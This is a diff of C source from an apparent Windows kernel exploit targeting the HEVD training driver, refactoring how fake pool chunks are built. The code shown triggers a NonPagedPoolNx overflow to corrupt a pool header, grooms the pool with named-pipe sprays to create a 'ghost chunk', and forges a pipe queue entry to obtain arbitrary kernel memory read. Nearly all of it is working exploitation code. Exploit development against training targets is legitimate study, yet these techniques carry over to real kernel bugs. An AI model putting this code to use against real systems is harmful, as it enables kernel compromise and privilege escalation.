@@ -5,7 +5,6 @@
 
 #include "primitives/arbitrary_read.h"
 
-#include "primitives/fake_chunk.h"
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
 
@@ -85,34 +84,26 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
     FreeEveryThirdPipe(create_holes_spray, 0);
 
     // Trigger vulnerability to manipulate adjacent chunk's pool header
-    char* overflow_chunk_buf = CreateFakeChunk(
-        NULL,
-        BACKWARD_STEP / 0x10, // previous size
-        0,                    // pool index
-        0,                    // block size
-        0 | 4,                // pool type (set aligned chunk flag)
-        NULL,
-        NULL,
-        NULL);
+    vs_chunk_t overflow_chunk = { 0 };
+    overflow_chunk.previous_size = BACKWARD_STEP / 0x10;
+    overflow_chunk.pool_index = 0;
+    overflow_chunk.block_size = 0;
+    overflow_chunk.pool_type = 0 | 4;                // set aligned chunk flag
 
     HANDLE hHevd = HevdOpenDeviceHandle();
-    HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, overflow_chunk_buf);
+    HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, (char*)&overflow_chunk);
     CloseHandle(hHevd);
 
     Sleep(2000);
 
-    char* fake_pool_header_chunk_buf = CreateFakeChunk(
-        NULL,
-        0,                                            // previous size
-        0,                                            // pool index
-        (GHOST_CHUNK_SIZE + POOL_HEADER_SIZE) / 0x10, // block size
-        0,                                            // pool type
-        0x4141414141,                                 // pool tag
-        NULL,
-        NULL);
+    vs_chunk_t fake_pool_header_chunk = { 0 };
+    fake_pool_header_chunk.previous_size = 0;
+    fake_pool_header_chunk.pool_index = 0;
+    fake_pool_header_chunk.block_size = (GHOST_CHUNK_SIZE + POOL_HEADER_SIZE) / 0x10;
+    fake_pool_header_chunk.pool_tag = 0x4141414141;
 
     puts("[*] Spraying pipes with fake POOL_HEADER...");
-    pipes->fake_pool_header = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, fake_pool_header_chunk_buf);
+    pipes->fake_pool_header = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, (char*)&fake_pool_header_chunk);
     PerformPipeSpray(pipes->fake_pool_header);
 
     lookaside_t* ghost_lookaside = prepareLookaside(GHOST_CHUNK_SIZE + 0x10);
@@ -130,7 +121,7 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
         // Free an existing pipe queue entry to create space for the ghost chunk
         FreeNPPNxChunk(&create_holes_spray->pipes[ghost_idx], create_holes_spray->bufsize);
         // Allocate a chunk of ghost chunk size and attempt to secure the created ghost chunk
-        AllocNPPNxChunk(&ghosts->pipes[ghost_idx], dummy_attribute, GHOST_CHUNK_BUFSIZE);
+        AllocNPPNxChunk(&ghosts->pipes[ghost_idx], (vs_chunk_t*)dummy_attribute, GHOST_CHUNK_BUFSIZE);
 
         // Check if ghost chunk creation and allocation was successful
         char leak[0x1000];
@@ -138,7 +129,7 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
         if (leaking_pipe_idx == -1)
         {
             // If ghost chunk creation failed, clear the lookaside list head and retry
-            AllocNPPNxChunk(&create_holes_spray->pipes[ghost_idx], create_holes_spray->data_buf, create_holes_spray->bufsize);
+            AllocNPPNxChunk(&create_holes_spray->pipes[ghost_idx], (vs_chunk_t*)create_holes_spray->data_buf, create_holes_spray->bufsize);
             continue;
         }
         else
@@ -174,32 +165,22 @@ int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
         return 0;
     }
 
-    pipe_queue_entry_t overwritten_pipe_entry;
-    overwritten_pipe_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
-    overwritten_pipe_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
-    overwritten_pipe_entry.linkedIRP = (uintptr_t)&g_fake_pipe_queue_sub;
-    overwritten_pipe_entry.SecurityClientContext = 0;
-    overwritten_pipe_entry.isDataInKernel = 0x1;
-    overwritten_pipe_entry.DataSize = 0xffffffff;
-    overwritten_pipe_entry.remaining_bytes = 0xffffffff;
-    overwritten_pipe_entry.field_2C = 0x43434343;
-
-    char* fake_pipe_queue_entry_buf = CreateFakeChunk(
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        &overwritten_pipe_entry);
+    vs_chunk_t fake_pipe_queue_entry_chunk = { 0 };
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.linkedIRP = (uintptr_t)&g_fake_pipe_queue_sub;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.SecurityClientContext = 0;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.isDataInKernel = 0x1;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.DataSize = 0xffffffff;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.remaining_bytes = 0xffffffff;
+    fake_pipe_queue_entry_chunk.pipe_queue_entry.field_2C = 0x43434343;
 
     puts("[*] Spraying pipes with fake pipe queue entry...");
     uintptr_t pipe_queue_entry_addr;
     do
     {
         FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - 0x40);
-        AllocNPPNxChunk(pipes->previous_pipe, fake_pipe_queue_entry_buf, TARGETED_VULN_SIZE - 0x40);
+        AllocNPPNxChunk(pipes->previous_pipe, &fake_pipe_queue_entry_chunk, TARGETED_VULN_SIZE - 0x40);
         ArbitraryRead(pipes->ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
     } while (pipe_queue_entry_addr == 0x434343434343005A);
 
